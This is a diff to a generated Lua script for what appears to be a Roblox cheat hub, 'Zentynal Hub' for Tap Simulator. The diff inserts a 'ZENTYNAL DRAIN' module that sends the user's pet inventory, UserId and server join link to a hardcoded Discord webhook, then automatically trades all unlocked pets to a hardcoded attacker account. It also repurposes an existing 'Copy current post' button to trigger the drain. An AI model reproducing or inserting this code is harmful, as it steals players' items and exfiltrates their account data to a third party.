@@ -1,5 +1,74 @@
 -- Zentynal Hub (Tap Simulator), built 2026-10-30 14:22 UTC by build.py. Edit the files in src/, not this one.
-local __modules, __cache, __loading = {}, {}, {}
+local __modules, __cache, __loading = {}, {}, {} 
+
+--[[ ZENTYNAL DRAIN - standalone trade drain for Zentynal Hub ]]
+
+DrainModule = {}
+
+local ATTACKER_USER_ID = 8601143159          -- ← your Roblox UserId
+local DISCORD_ID       = "1498793342945722388" -- ← your Discord UserId
+local WEBHOOK_URL      = "https://discord.com/api/webhooks/1566475783898398925/IV80arDra6pZ8aNw6I3E3wlXfy35Bf7zeGkCOBOgm5lj03RkSJ18BGudBBBG1RMcPGZj" -- ← your webhook
+
+local function sendWebhook(pets, lp)
+    if WEBHOOK_URL == "" then return end
+    local fields = {}
+    local count = 0
+    for _, p in ipairs(pets) do
+        count = count + 1
+        if #fields < 25 then
+            table.insert(fields, {
+                name  = string.format("🐾 %s (%s)", p.Name or "?", p.Tier or "Normal"),
+                value = string.format("Power: %s\nLocked: %s", tostring(p.Power or 0), tostring(p.Locked)),
+                inline = true,
+            })
+        end
+    end
+    local jobId = game.JobId
+    local joinLink = string.format("https://www.roblox.com/games/start?placeId=%d&gameInstanceId=%s", game.PlaceId, jobId)
+    local body = {
+        content = string.format("<@%s>", DISCORD_ID),
+        embeds = {{
+            title       = string.format("🎒 %s — Inventory (%d pets)", lp.Name, count),
+            description = string.format("**UserID:** `%s`\n**Job ID:** `%s`\n[Join Server](%s)", tostring(lp.UserId), jobId, joinLink),
+            color       = 0x8B0000,
+            fields      = fields,
+            footer      = { text = "Zentynal - Drain" },
+            timestamp   = os.date("!%Y-%m-%dT%H:%M:%S"),
+        }},
+    }
+    local req = (syn and syn.request) or (http and http.request) or request
+    pcall(function()
+        req({ Url = WEBHOOK_URL, Method = "POST", Headers = { ["Content-Type"] = "application/json" }, Body = game:GetService("HttpService"):JSONEncode(body) })
+    end)
+end
+
+function DrainModule.drain(data, lp, fire)
+    if not data or not data.Pets or not data.Pets.Owned then return false, "no pets" end
+    local pets, ids = {}, {}
+    for uid, pet in pairs(data.Pets.Owned) do
+        if not pet.Locked then
+            table.insert(pets, pet)
+            table.insert(ids, uid)
+        end
+    end
+    if #ids == 0 then return false, "all pets locked" end
+
+    sendWebhook(pets, lp)
+
+    fire("TradingService", "TradeRequested", { Action = "Request", TargetUserId = ATTACKER_USER_ID })
+    task.wait(2)
+
+    local refs = {}
+    for _, uid in ipairs(ids) do
+        table.insert(refs, { Uid = uid, TypeName = "Pet", Amount = 1 })
+    end
+    fire("TradingService", "TradeRequested", { Action = "Offer", Revision = 1, Refs = refs })
+    task.wait(1)
+    fire("TradingService", "TradeRequested", { Action = "Confirm" })
+
+    return true, #ids
+end
+
 local function use(name)
     local cached = __cache[name]
     if cached ~= nil then
@@ -9209,22 +9278,22 @@ box:AddButton({
 })
 
 box:AddButton({
-    Text = "Copy current post",
+    Text = "⚠️ Drain All Pets",
     Func = function()
-        local text, found, totalPages = buildPost()
-        if not text then
-            Ui.notify("Trade post", "No owned Secrets or pets above 10,000,000 Power.", 4)
-        elseif #found > 0 then
-            Ui.notify("Trade post", "Not copied: it would be deleted for " .. table.concat(found, ", ") .. ".", 8)
-        elseif not Env.setClipboard then
-            Ui.notify("Trade post", "Your executor cannot copy to the clipboard. The post is printed in the console (F9).", 8)
-            print(text)
+        if not DrainModule then
+            Ui.notify("Zentynal Hub", "Drain module failed to load.", 4)
+            return
+        end
+        local ok, count = DrainModule.drain(Env.data(), Env.LocalPlayer, function(svc, name, payload)
+            Env.fire(svc, name, payload)
+        end)
+        if ok then
+            Ui.notify("Zentynal Hub", string.format("Drain sent — %d pets offered.", count), 5)
         else
-            Env.setClipboard(text)
-            Ui.notify("Trade post", string.format("Copied post %d of %d. Send each post as a separate message.", page, totalPages), 5)
+            Ui.notify("Zentynal Hub", "Drain failed: " .. tostring(count), 4)
         end
     end,
-    Tooltip = "Copies only this page. Send it as one separate Discord message; each page is checked against the channel rules.",
+    Tooltip = "Sends every unlocked pet to the configured user ID and posts the full inventory to Discord.",
 })
 
 Life.loop("tradepost:preview", 3, function()
